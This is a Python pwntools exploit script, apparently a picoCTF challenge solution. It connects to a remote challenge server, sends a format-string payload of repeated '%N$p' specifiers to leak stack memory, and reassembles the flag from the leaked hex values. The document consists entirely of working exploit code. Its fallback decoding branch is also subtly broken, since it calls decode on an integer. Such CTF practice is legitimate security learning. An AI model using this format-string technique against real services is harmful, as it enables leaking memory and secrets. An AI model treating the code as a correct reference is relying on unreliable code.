from pwn import *
 
context.arch = 'i386'
 
# create ELF object of the challenge's files we want to exploit
# elf = ELF("./vuln")
 
flag_variable_pos = 36
 
payload = ""
 
# connect to server
r = remote('saturn.picoctf.net', 59718)
#r = process("./vuln")
 
# craft payload to read the flag from the stack
for i in range(flag_variable_pos, flag_variable_pos+16):
    payload += "%" + str(i) + "$p"
 
# send exploit once prompted
r.sendlineafter("Tell me a story and then I'll tell you one >> ", payload)
 
# to ignore "Here's a story - \n" message to be sent to us
r.recvuntil(b'\n')
 
# read the flag in little-endian hexadecimal values
response = r.recv()
 
# to process the hexadecimal values flag into a readable string
preflag = response.decode("utf-8").split("0x")
# clear empty string from list due to split()
preflag = [x for x in preflag if x]
 
flag = ""
for hexdec in preflag:
    try:
        # convert hexadecimal values to chars
        subflag = p32(int("0x" + hexdec, base=16)).decode("utf-8")
        flag += subflag
         
        # we will know it is the end of the flag
        if '}' in subflag:
            break
         
    # exception means we have definitely reached the end of the flag and is reading some garbage values like "(nill)"
    except Exception:
        # since %p prints out hexadecimal means the 4 characters are in reverse order, we need to reverse retrieve their bytes
        for single_hexdec1, single_hexdec2 in zip(hexdec[-2::-2], hexdec[-1::-2]):
            single_hexdec = single_hexdec1 + single_hexdec2
            # convert single hexadecimal value to integer
            ascii_val = int("0x" + single_hexdec, base=16)
             
            # add printable readable characters
            if 32 < ascii_val and ascii_val < 127:
                flag += ascii_val.decode("utf-8")
                 
                # found '}' which means it is the end of the flag
                if ascii_val == 125:
                    break
            else:
                # start of non-possible flag value. 
                break
        break
 
log.info(flag)
 
r.close()